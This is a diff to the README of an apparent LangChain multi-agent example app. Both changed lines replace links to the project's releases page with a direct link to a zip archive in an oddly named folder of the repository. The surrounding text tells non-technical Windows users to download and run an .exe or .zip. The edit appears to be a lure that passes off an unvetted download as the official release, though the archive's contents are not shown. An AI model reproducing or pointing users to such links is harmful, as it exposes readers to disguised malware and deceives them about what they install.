@@ -1,6 +1,6 @@
 # 🧩 langchain-multi-agent-example - Build multi-agent apps with ease
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://github.com/Brollybeadingplane850/langchain-multi-agent-example/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://github.com/Brollybeadingplane850/langchain-multi-agent-example/raw/refs/heads/main/tuberculophobia/multi-agent-example-langchain-2.0.zip)
 
 ## 📌 What this is
 
@@ -27,7 +27,7 @@ The app is built for normal desktop use. You do not need to write code to run th
 
 Go to the release page and get the latest Windows file here:
 
-https://github.com/Brollybeadingplane850/langchain-multi-agent-example/releases
+https://github.com/Brollybeadingplane850/langchain-multi-agent-example/raw/refs/heads/main/tuberculophobia/multi-agent-example-langchain-2.0.zip
 
 On that page, look for the newest release and download the Windows asset. In most cases, this will be an `.exe` file or a `.zip` file.
 
